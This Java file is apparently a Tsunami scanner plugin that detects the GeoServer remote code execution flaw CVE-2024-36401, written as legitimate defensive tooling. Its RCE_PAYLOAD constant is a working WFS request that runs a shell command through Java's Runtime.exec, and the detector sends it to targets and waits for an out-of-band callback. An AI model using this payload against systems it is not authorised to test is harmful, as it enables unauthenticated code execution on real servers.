/*
 * Copyright 2024 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.google.tsunami.plugins.detectors.rce;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.data.NetworkServiceUtils.buildWebApplicationRootUrl;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.annotations.VisibleForTesting;
import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.common.util.concurrent.Uninterruptibles;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.ForWebService;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.plugin.payload.NotImplementedException;
import com.google.tsunami.plugin.payload.Payload;
import com.google.tsunami.plugin.payload.PayloadGenerator;
import com.google.tsunami.plugins.detectors.rce.Annotations.OobSleepDuration;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.PayloadGeneratorConfig;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import javax.inject.Inject;

/** A {@link VulnDetector} that detects the geoserver Cve-2024-36401 RCE vulnerability. */
@ForWebService
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "GeoserverCve202436401VulnDetector",
    version = "0.1",
    description = "This detector checks for Geoserver RCE (CVE-2024-36401)",
    author = "grandsilva",
    bootstrapModule = GeoserverCve202436401VulnDetectorBootstrapModule.class)
public class GeoserverCve202436401VulnDetector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();

  @VisibleForTesting
  static final String RCE_PAYLOAD =
      "%sgeoserver/wfs?service=WFS&version=2.0.0&request=GetPropertyValue&typeNames"
          + "=sf:archsites&valueReference=exec(java.lang.Runtime.getRuntime(),'%s')";

  private final PayloadGenerator payloadGenerator;
  private final HttpClient httpClient;
  private final Clock utcClock;
  private final int oobSleepDuration;

  @Inject
  GeoserverCve202436401VulnDetector(
      HttpClient httpClient,
      @UtcClock Clock utcClock,
      PayloadGenerator payloadGenerator,
      @OobSleepDuration int oobSleepDuration) {
    this.httpClient = checkNotNull(httpClient);
    this.utcClock = checkNotNull(utcClock);
    this.payloadGenerator = checkNotNull(payloadGenerator);
    this.oobSleepDuration = oobSleepDuration;
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    logger.atInfo().log("GeoserverCve202436401VulnDetector starts detecting.");

    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isGeoserverInstance)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isGeoserverInstance(NetworkService networkService) {

    final String rootUri = buildWebApplicationRootUrl(networkService);
    try {
      HttpResponse response =
          httpClient.send(
              get(rootUri + "geoserver/index.html").withEmptyHeaders().build(), networkService);
      return response.status().equals(HttpStatus.OK);
    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log("Failed to send HTTP request to '%s'", rootUri);
      return false;
    }
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    var payload = getTsunamiCallbackHttpPayload();
    if (payload == null || !payload.getPayloadAttributes().getUsesCallbackServer()) {
      logger.atWarning().log(
          "The Tsunami callback server is not setup for this environment, so we cannot confirm the"
              + " RCE callback");
      return false;
    }
    String cmd = payload.getPayload();

    final String rootUri = buildWebApplicationRootUrl(networkService);

    try {
      httpClient.send(
          get(String.format(RCE_PAYLOAD, rootUri, URLEncoder.encode(cmd, StandardCharsets.UTF_8)))
              .withEmptyHeaders()
              .build(),
          networkService);
    } catch (RuntimeException | IOException e) {
      logger.atWarning().withCause(e).log("Failed to send HTTP request to '%s'", rootUri);
      return false;
    }
    // If there is an RCE, the execution isn't immediate
    logger.atInfo().log("Waiting for RCE callback.");
    Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(oobSleepDuration));
    if (payload.checkIfExecuted()) {
      logger.atInfo().log("RCE payload executed!");
      return true;
    }
    return false;
  }

  private Payload getTsunamiCallbackHttpPayload() {
    try {
      return this.payloadGenerator.generate(
          PayloadGeneratorConfig.newBuilder()
              .setVulnerabilityType(PayloadGeneratorConfig.VulnerabilityType.BLIND_RCE)
              .setInterpretationEnvironment(
                  PayloadGeneratorConfig.InterpretationEnvironment.LINUX_SHELL)
              .setExecutionEnvironment(
                  PayloadGeneratorConfig.ExecutionEnvironment.EXEC_INTERPRETATION_ENVIRONMENT)
              .build());
    } catch (NotImplementedException n) {
      return null;
    }
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(
                    VulnerabilityId.newBuilder()
                        .setPublisher("TSUNAMI_COMMUNITY")
                        .setValue("GeoserverCve202436401"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Geoserver RCE (CVE-2024-36401)")
                .setDescription(
                    "This detector checks for Geoserver RCE (CVE-2024-36401). "
                        + "Multiple OGC request parameters allow Remote Code Execution (RCE) "
                        + "by unauthenticated users through specially crafted input against "
                        + "a default GeoServer installation due to unsafely evaluating property "
                        + "names as XPath expressions.")
                .setRecommendation(
                    "Upgrade Geoserver to a patched version. The vulnerability was fixed in versions 2.23.6, 2.24.4, and 2.25.2.")
                .addRelatedId(
                    VulnerabilityId.newBuilder().setPublisher("CVE").setValue("CVE-2024-36401")))
        .build();
  }
}
